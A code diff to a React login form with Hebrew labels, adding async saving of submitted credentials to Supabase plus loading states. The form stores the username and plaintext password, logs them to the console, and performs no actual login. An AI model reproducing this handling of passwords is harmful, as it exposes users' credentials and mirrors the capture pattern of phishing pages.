@@ -9,29 +9,38 @@ const LoginForm: React.FC = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [rememberMe, setRememberMe] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    setIsLoading(true);
     
-    // Create data object
-    const loginData = {
-      username,
-      password,
-      rememberMe,
-      timestamp: new Date().toISOString()
-    };
-    
-    // Save the data
-    saveLoginData(loginData);
-    
-    console.log('Login data saved:', loginData);
-    
-    // Clear form
-    setUsername('');
-    setPassword('');
-    setRememberMe(false);
-    
-    alert('נתונים נשמרו בהצלחה!'); // "Data saved successfully!" in Hebrew
+    try {
+      // Create data object
+      const loginData = {
+        username,
+        password,
+        rememberMe,
+        timestamp: new Date().toISOString()
+      };
+      
+      // Save the data to Supabase
+      await saveLoginData(loginData);
+      
+      console.log('Login data saved:', loginData);
+      
+      // Clear form
+      setUsername('');
+      setPassword('');
+      setRememberMe(false);
+      
+      alert('נתונים נשמרו בהצלחה ב-Supabase!'); // "Data saved successfully to Supabase!" in Hebrew
+    } catch (error) {
+      console.error('Error saving data:', error);
+      alert('שגיאה בשמירת הנתונים'); // "Error saving data" in Hebrew
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   return (
@@ -65,6 +74,7 @@ const LoginForm: React.FC = () => {
                 className="w-full h-12 px-4 text-right border-gray-200 rounded-lg focus:border-orange focus:ring-orange transition-colors duration-200"
                 dir="rtl"
                 required
+                disabled={isLoading}
               />
             </div>
 
@@ -78,6 +88,7 @@ const LoginForm: React.FC = () => {
                 className="w-full h-12 px-4 text-right border-gray-200 rounded-lg focus:border-orange focus:ring-orange transition-colors duration-200"
                 dir="rtl"
                 required
+                disabled={isLoading}
               />
             </div>
 
@@ -85,9 +96,10 @@ const LoginForm: React.FC = () => {
             <div className="pt-4">
               <Button
                 type="submit"
-                className="w-full h-12 bg-orange hover:bg-orange-hover text-white font-medium rounded-lg transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98]"
+                disabled={isLoading}
+                className="w-full h-12 bg-orange hover:bg-orange-hover text-white font-medium rounded-lg transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98] disabled:opacity-50"
               >
-                כניסה לחשבון
+                {isLoading ? 'שומר...' : 'כניסה לחשבון'}
               </Button>
             </div>
           </form>
